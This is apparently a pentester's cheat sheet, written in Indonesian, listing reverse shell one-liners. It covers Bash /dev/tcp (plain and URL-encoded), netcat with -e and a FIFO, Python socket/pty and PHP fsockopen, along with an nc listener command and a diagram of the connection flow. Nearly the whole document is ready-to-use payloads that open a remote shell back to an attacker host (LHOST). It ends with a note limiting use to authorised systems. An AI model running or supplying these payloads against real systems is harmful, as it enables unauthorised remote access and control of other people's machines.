# Reverse Shell Payloads

> **LHOST = IP mesin Kali/pentester yang menjalankan listener.**  
> **LPORT = Port listener.**

## Bash

```bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1

# <LHOST> → IP mesin Kali/pentester
# 4444    → Port listener
```

**Keterangan:**  
Membuat koneksi dari target kembali ke mesin Kali menggunakan Bash.

---

## Bash (URL-Encoded)

```text
bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<LHOST>/4444%200>%261'

# Digunakan ketika payload perlu dikirim melalui URL
# atau parameter web yang membutuhkan URL encoding.
```

---

## Netcat

### Netcat dengan `-e`

```bash
nc -e /bin/bash <LHOST> 4444

# <LHOST> → IP mesin Kali/pentester
# 4444    → Port listener
# -e      → Menjalankan program setelah koneksi berhasil
```

> **Catatan:** opsi `-e` tidak tersedia pada semua versi Netcat.

### Netcat + FIFO

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f

# Menggunakan named pipe (FIFO) sebagai alternatif
# ketika Netcat tidak mendukung opsi -e.
```

---

## Python

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# <LHOST> → IP mesin Kali/pentester
# 4444    → Port listener
# socket  → Membuat koneksi ke LHOST
# pty     → Menjalankan shell interaktif
```

**Keterangan:**  
Menggunakan Python untuk membuat koneksi TCP dan menjalankan Bash secara
interaktif.

---

## PHP (One-Liner)

```bash
php -r '$s=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# <LHOST> → IP mesin Kali/pentester
# 4444    → Port listener
# fsockopen() → Membuat koneksi TCP
# exec()      → Menjalankan command pada sistem
```

---

## Listener

Jalankan listener pada mesin Kali **sebelum payload dipicu**:

```bash
nc -lvnp 4444

# -l → Listen mode
# -v → Verbose
# -n → Tanpa DNS resolution
# -p → Port listener
```

---

## Alur Reverse Shell

```text
┌──────────────────────┐
│ Kali / Pentester     │
│ LHOST: <KALI_IP>     │
│ LPORT: 4444          │
│ nc -lvnp 4444        │
└──────────▲───────────┘
           │
           │ Reverse Connection
           │
┌──────────┴───────────┐
│ Target Server        │
│ Menjalankan Payload  │
└──────────────────────┘
```

```text
LHOST   = IP mesin Kali / Pentester
LPORT   = Port listener
TARGET  = Mesin yang menjalankan payload
```

## Referensi

- [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)
- `php-reverse-shell.php` — tersedia pada repository ini.

> **Catatan:** Reverse shell hanya digunakan pada sistem yang dimiliki atau
> secara eksplisit diizinkan untuk pengujian keamanan.
